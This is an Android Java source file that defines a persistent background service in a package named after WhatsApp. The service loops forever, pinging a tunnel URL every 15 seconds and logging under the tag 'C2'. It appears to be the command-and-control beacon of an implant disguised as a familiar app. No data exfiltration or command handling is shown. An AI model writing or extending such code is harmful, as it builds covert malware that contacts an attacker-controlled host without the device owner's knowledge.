package com.example.whatsapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class CoreService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        URL url = new URL("https://0d686f3e80ade2.app.lhr.life/ping");
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        int responseCode = conn.getResponseCode();
                        Log.d("C2", "Ping sent: " + responseCode);
                        Thread.sleep(15000);
                    } catch (Exception e) {
                        Log.e("C2", "Error", e);
                        try { Thread.sleep(5000); } catch (Exception ignored) {}
                    }
                }
            }
        }).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
